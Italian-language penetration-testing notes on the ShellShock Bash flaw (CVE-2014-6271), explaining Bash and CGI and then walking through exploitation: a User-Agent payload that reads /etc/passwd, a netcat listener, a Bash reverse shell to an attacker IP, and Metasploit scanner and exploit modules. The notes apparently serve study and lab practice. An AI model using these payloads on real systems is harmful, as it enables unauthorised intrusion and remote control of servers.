<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# Bash CVE-2014-6271 ShellShock

**ShellShock** è una vulnerabilità critica scoperta nel 2014 che interessa molte versioni del linguaggio **Bash** su sistemi *Unix-like*. Consente ad un attaccante di eseguire comandi arbitrari su un server vulnerabile sfruttando variabili d'ambiente manipolate, comunemente attraverso script **CGI** serviti da **Apache**.

## Bash e CGI

**Bash (Bourne Again Shell)** è una shell a riga di comando molto diffusa nei sistemi Linux. <br>
Una **shell** è l'interfaccia testuale che consente l'interazione diretta con il sistema operativo, eseguendo comandi e script.

**CGI (Common Gateway Interface)** è uno standard che permette a un web server (es. Apache) di eseguire programmi o script (come `.cgi` o `.sh`) esterni, al fine di generare contenuti dinamici. <br>
Quando un utente visita una pagina che richiede un'elaborazione, il server Apache invoca lo script CGI per processare l'informazione.

Gli script `.cgi` sono spesso scritti in Bash, Python o Perl, ed eseguono codice con i permessi del server web. <br>
Se la shell di riferimento è una versione di Bash vulnerabile, gli script possono essere utilizzati per iniettare comandi arbitrari sfruttando ShellShock.

La vulnerabilità è causata dal modo in cui Bash gestisce **le variabili d'ambiente contenenti dichiarazioni di funzione**: 
```bash
() { :; }; echo vulnerabile
```
Questa stringa dovrebbe essere interpretata come una funzione vuota, ma Bash esegue anche il comando `echo vulnerabile`, rendendo possibile l'injection di comandi.

---

## Exploitation manuale via BurpSuite

Impostiamo il proxy FoxyProxy su Firefox e abilitiamo **Intercept** su BurpSuite.

Carichiamo la pagina CGI e intercettiamo la richiesta HTTP. Cerchiamo l'header:
```http
User-Agent: Mozilla/5.0 (...)
```
Sostituiamo il valore con:
```bash
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```
- `() { :; };` → definisce una funzione vuota
- `echo; echo;` → aggiunge output visibile per test
- `/bin/bash -c '<comando>'` → esegue il comando specificato

adesso abbiamo la possilitá di lanciare i comandi che vogliamo e quindi possiamo aprire una reverse shell dando il comando:

`nc -nvlp <PORTA>`

per configurare Netcat in modo che sia in ascolto su una determinata porta

successivamente possiamo usare il seguente comando
```bash
bash -i >& /dev/tcp/<IPAttaccante>/<PORTA> 0>&1
```
da inserire su BurpSuite.

Quindi il comando completo sará:
```bash
() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/<IPAttaccante>/<PORTA> 0>&1'
```

Appena il comando viene eseguito, avremo una reverse shell interattiva dal target vulnerabile.

---

## Exploitation automatizzato con Metasploit

### Scanner:
```bash
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS <IP>
set TARGETURI /cgi-bin/script.cgi
run
```

### Exploit:
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <IP>
set TARGETURI /cgi-bin/script.cgi
set PAYLOAD cmd/unix/reverse_netcat #meglio lasicare quello di default
set LHOST <IPAttaccante>
set LPORT <Porta>
run
```
Questo modulo automatizza l'invio del payload e apre una reverse shell sulla macchina target.

>Consiglio di vedere la pagina <a href="https://github.com/opsxcq/exploit-CVE-2014-6271">GitHub</a> per avere maggiori dettagli.

---
